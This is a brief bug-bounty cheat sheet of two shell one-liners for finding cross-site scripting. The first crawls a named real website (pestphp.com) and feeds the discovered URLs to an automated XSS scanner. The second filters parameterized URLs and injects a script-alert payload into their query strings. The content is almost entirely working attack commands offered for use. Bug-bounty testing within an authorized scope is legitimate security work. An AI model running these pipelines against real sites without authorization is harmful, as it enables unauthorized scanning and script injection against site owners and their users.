...
# Oneliner commands for bug bounty

xss + urls

```
katana -u "https://pestphp.com/" | cariddi | dalfox pipe --proxy http://127.0.0.1:8080 | tee -a pest_test_urls.txt

cat pest_test_urls.txt | egrep -iv ".(jpg|jpeg|gif|css|tif|tiff|png|ttf|woff|woff2|ico|pdf|svg|txt|js)" | grep "=" | qsreplace '"><script>alert(1)</script>'
```
